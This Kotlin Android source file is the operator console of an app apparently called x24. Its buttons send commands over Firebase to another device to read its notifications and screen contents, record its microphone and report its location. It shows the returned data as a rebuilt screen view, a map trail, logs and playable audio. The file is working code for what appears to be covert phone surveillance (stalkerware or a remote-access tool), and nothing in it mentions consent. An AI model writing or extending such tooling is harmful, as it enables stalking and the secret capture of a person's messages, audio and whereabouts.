package com.jonas.x24

import android.content.ContentValues
import android.content.Context
import android.graphics.BitmapFactory
import android.graphics.Color
import android.media.MediaPlayer
import android.os.Build
import android.os.Bundle
import java.util.regex.Pattern
import android.graphics.Rect
import android.view.WindowManager
import android.view.WindowInsetsController
import android.view.WindowInsets
import android.widget.ScrollView
import android.widget.FrameLayout
import com.google.android.material.tabs.TabLayout
import android.os.Environment
import android.provider.MediaStore
import android.util.Base64
import android.view.View
import android.widget.Button
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import org.osmdroid.config.Configuration
import org.osmdroid.util.GeoPoint
import org.osmdroid.views.MapView
import org.osmdroid.views.overlay.Marker
import org.osmdroid.views.overlay.Polyline
import java.io.File
import java.io.FileOutputStream

class MonitorActivity : AppCompatActivity() {

    private lateinit var sessionKey: String
    private lateinit var database: DatabaseReference
    private lateinit var tvResults: TextView
    private lateinit var mapView: MapView
    private lateinit var btnSaveAudio: Button
    private lateinit var llResults: LinearLayout

    private lateinit var tabLayout: TabLayout
    private lateinit var tabControls: ScrollView
    private lateinit var tabScreen: FrameLayout
    private lateinit var tabMap: FrameLayout
    private lateinit var tabResults: ScrollView
    private lateinit var screenReconstructionView: ScreenReconstructionView
    private lateinit var btnFullScreenToggle: Button
    private var isFullScreen = false
    private var lastAudioBase64: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Configuration.getInstance().load(applicationContext, getSharedPreferences("osmdroid", Context.MODE_PRIVATE))
        setContentView(R.layout.activity_monitor)

        sessionKey = intent.getStringExtra("SESSION_KEY") ?: return finish()
        database = FirebaseDatabase.getInstance().reference.child("sessions").child(sessionKey)

        mapView = findViewById(R.id.mapView)
        mapView.setMultiTouchControls(true)

        btnSaveAudio = findViewById(R.id.btnSaveAudio)
        llResults = findViewById(R.id.llResults)
        tvResults = findViewById(R.id.tvResults)

        tabLayout = findViewById(R.id.tabLayout)
        tabControls = findViewById(R.id.tabControls)
        tabScreen = findViewById(R.id.tabScreen)
        tabMap = findViewById(R.id.tabMap)
        tabResults = findViewById(R.id.tabResults)
        screenReconstructionView = findViewById(R.id.screenReconstructionView)
        btnFullScreenToggle = findViewById(R.id.btnFullScreenToggle)

        setupTabs()

        btnFullScreenToggle.setOnClickListener {
            toggleFullScreen()
        }

        btnSaveAudio.setOnClickListener {
            saveLatestAudioToDownloads()
        }

        findViewById<Button>(R.id.btnReadNotifications).setOnClickListener {
            sendCommand("READ_NOTIFICATIONS")
            tabLayout.getTabAt(3)?.select() // Jump to Results
        }

        findViewById<Button>(R.id.btnReadScreen).setOnClickListener {
            sendCommand("READ_SCREEN")
            tabLayout.getTabAt(1)?.select() // Jump to Screen Tab
        }

        findViewById<Button>(R.id.btnStartRecord).setOnClickListener {
            sendCommand("START_RECORD_AUDIO")
        }

        findViewById<Button>(R.id.btnStopRecord).setOnClickListener {
            sendCommand("STOP_RECORD_AUDIO")
        }

        findViewById<Button>(R.id.btnGetLocation).setOnClickListener {
            sendCommand("GET_LOCATION")
            tabLayout.getTabAt(2)?.select() // Jump to Map
        }

        findViewById<Button>(R.id.btnLogout).setOnClickListener {
            logout()
        }

        listenForResults()
    }

    override fun onResume() {
        super.onResume()
        mapView.onResume()
    }

    override fun onPause() {
        super.onPause()
        mapView.onPause()
    }

    private fun setupTabs() {
        tabLayout.addTab(tabLayout.newTab().setText("Controls"))
        tabLayout.addTab(tabLayout.newTab().setText("Screen"))
        tabLayout.addTab(tabLayout.newTab().setText("Map"))
        tabLayout.addTab(tabLayout.newTab().setText("Logs"))

        tabLayout.addOnTabSelectedListener(object : TabLayout.OnTabSelectedListener {
            override fun onTabSelected(tab: TabLayout.Tab?) {
                tabControls.visibility = View.GONE
                tabScreen.visibility = View.GONE
                tabMap.visibility = View.GONE
                tabResults.visibility = View.GONE

                when (tab?.position) {
                    0 -> tabControls.visibility = View.VISIBLE
                    1 -> tabScreen.visibility = View.VISIBLE
                    2 -> tabMap.visibility = View.VISIBLE
                    3 -> tabResults.visibility = View.VISIBLE
                }
            }
            override fun onTabUnselected(tab: TabLayout.Tab?) {}
            override fun onTabReselected(tab: TabLayout.Tab?) {}
        })
    }

    private fun toggleFullScreen() {
        isFullScreen = !isFullScreen
        if (isFullScreen) {
            tabLayout.visibility = View.GONE
            btnFullScreenToggle.text = "Exit Full Screen"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window.insetsController?.hide(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
                window.insetsController?.systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            } else {
                @Suppress("DEPRECATION")
                window.decorView.systemUiVisibility = (View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY)
            }
        } else {
            tabLayout.visibility = View.VISIBLE
            btnFullScreenToggle.text = "Full Screen"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window.insetsController?.show(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
            } else {
                @Suppress("DEPRECATION")
                window.decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_VISIBLE
            }
        }
    }

    private fun logout() {
        val prefs = getSharedPreferences("x24_prefs", android.content.Context.MODE_PRIVATE)
        prefs.edit().clear().apply()
        val intent = android.content.Intent(this, MainActivity::class.java)
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK)
        startActivity(intent)
        finish()
    }

    private fun sendCommand(command: String) {
        val commandRef = database.child("commands").push()
        val data = mapOf(
            "command" to command,
            "timestamp" to System.currentTimeMillis()
        )
        commandRef.setValue(data).addOnSuccessListener {
            Toast.makeText(this, "Command sent: $command", Toast.LENGTH_SHORT).show()
        }
    }

    private fun listenForResults() {
        database.child("results").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val children = snapshot.children.toList()

                // Clear map overlays before adding new ones from history
                mapView.overlays.clear()
                val geoPoints = mutableListOf<GeoPoint>()

                // Rebuild UI history
                llResults.removeAllViews()
                llResults.addView(tvResults) // Keep the original text view at top if needed
                llResults.addView(btnSaveAudio)

                for (child in children) {
                    val type = child.child("type").value as? String
                    val data = child.child("data").value as? String

                    if (type != null && data != null) {
                        appendResultToHistory(type, data, geoPoints)
                    }
                }

                // Update map if locations exist
                if (geoPoints.isNotEmpty()) {
                    mapView.visibility = View.VISIBLE
                    val polyline = Polyline()
                    polyline.setPoints(geoPoints)
                    polyline.color = Color.BLUE
                    mapView.overlays.add(polyline)

                    val currentPoint = geoPoints.last()
                    val marker = Marker(mapView)
                    marker.position = currentPoint
                    marker.setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
                    marker.title = "Current Location"
                    mapView.overlays.add(marker)

                    mapView.controller.setZoom(15.0)
                    mapView.controller.setCenter(currentPoint)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Toast.makeText(this@MonitorActivity, "Error listening to results", Toast.LENGTH_SHORT).show()
            }
        })
    }

    private fun appendResultToHistory(type: String, data: String, geoPoints: MutableList<GeoPoint>) {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 16, 0, 16)
        }

        val tv = TextView(this).apply {
            textSize = 14f
            setTextIsSelectable(true)
        }

        when (type) {
            "TEXT" -> {
                if (data.startsWith("Screen Context:")) {
                    tv.text = "Screen Read Received and Rendered in Screen Tab."
                    tv.setTypeface(null, android.graphics.Typeface.BOLD)
                    container.addView(tv)
                    buildScreenReadUI(data) // Parse and pass to ScreenReconstructionView

                    // Switch to Screen tab if not already there
                    tabLayout.getTabAt(1)?.select()
                } else if (data.contains("Coords:")) {
                    tv.text = data
                    container.addView(tv)
                    parseLocationData(data, geoPoints)
                    tabLayout.getTabAt(2)?.select() // Jump to Map
                } else {
                    tv.text = "Text Result:\n$data"
                    container.addView(tv)
                    tabLayout.getTabAt(3)?.select() // Jump to Logs
                }
            }
            "AUDIO" -> {
                tv.text = "Audio received."
                container.addView(tv)
                lastAudioBase64 = data
                btnSaveAudio.visibility = View.VISIBLE

                val btnPlay = Button(this).apply {
                    text = "Play Audio"
                    setOnClickListener { playAudioFromBase64(data) }
                }
                container.addView(btnPlay)
                tabLayout.getTabAt(3)?.select() // Jump to Logs
            }
            "ERROR" -> {
                tv.text = "Error: $data"
                tv.setTextColor(Color.RED)
                container.addView(tv)
                tabLayout.getTabAt(3)?.select() // Jump to Logs
            }
        }

        llResults.addView(container, 0) // Add to top
    }

    private fun buildScreenReadUI(data: String) {
        val lines = data.lines().drop(1) // Drop "Screen Context:" line
        val elements = mutableListOf<ScreenElement>()

        // Example format: [Button] Submit (bounds: 100,200,300,400) id: submit_btn
        val regex = Pattern.compile("\\[(.*?)\\](.*?)\\(bounds: (-?\\d+),(-?\\d+),(-?\\d+),(-?\\d+)\\)(.*)")

        for (line in lines) {
            if (line.isBlank()) continue
            val matcher = regex.matcher(line)
            if (matcher.find()) {
                val type = matcher.group(1)?.trim() ?: "Text"
                val label = matcher.group(2)?.trim() ?: ""
                val left = matcher.group(3)?.toIntOrNull() ?: 0
                val top = matcher.group(4)?.toIntOrNull() ?: 0
                val right = matcher.group(5)?.toIntOrNull() ?: 0
                val bottom = matcher.group(6)?.toIntOrNull() ?: 0

                // Avoid degenerate bounds
                if (right > left && bottom > top) {
                    val rect = Rect(left, top, right, bottom)
                    elements.add(ScreenElement(type, label, rect))
                }
            }
        }

        screenReconstructionView.setElements(elements)
    }

    private fun parseLocationData(data: String, geoPoints: MutableList<GeoPoint>) {
        val coordsLine = data.lines().find { it.startsWith("Coords:") }
        if (coordsLine != null) {
            val parts = coordsLine.removePrefix("Coords:").trim().split(",")
            if (parts.size == 2) {
                try {
                    val lat = parts[0].trim().toDouble()
                    val lon = parts[1].trim().toDouble()
                    geoPoints.add(GeoPoint(lat, lon))
                } catch (e: Exception) {
                    // Ignore parse errors
                }
            }
        }
    }

    private fun playAudioFromBase64(base64Audio: String) {
        try {
            val audioBytes = Base64.decode(base64Audio, Base64.DEFAULT)
            val tempFile = File.createTempFile("received_audio", ".3gp", cacheDir)
            val fos = FileOutputStream(tempFile)
            fos.write(audioBytes)
            fos.close()

            val mediaPlayer = MediaPlayer()
            mediaPlayer.setDataSource(tempFile.absolutePath)
            mediaPlayer.prepare()
            mediaPlayer.start()

            mediaPlayer.setOnCompletionListener {
                it.release()
                tempFile.delete()
            }
        } catch (e: Exception) {
            tvResults.text = "Error playing audio: ${e.message}"
        }
    }

    private fun saveLatestAudioToDownloads() {
        val audioBase64 = lastAudioBase64
        if (audioBase64 == null) {
            Toast.makeText(this, "No audio to save.", Toast.LENGTH_SHORT).show()
            return
        }

        try {
            val audioBytes = Base64.decode(audioBase64, Base64.DEFAULT)
            val fileName = "x24_audio_${System.currentTimeMillis()}.3gp"

            val resolver = applicationContext.contentResolver
            val contentValues = ContentValues().apply {
                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                put(MediaStore.MediaColumns.MIME_TYPE, "audio/3gpp")
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
                }
            }

            val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
            if (uri != null) {
                resolver.openOutputStream(uri)?.use { outputStream ->
                    outputStream.write(audioBytes)
                }
                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
            } else {
                Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
            }
        } catch (e: Exception) {
            Toast.makeText(this, "Error saving audio: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }
}
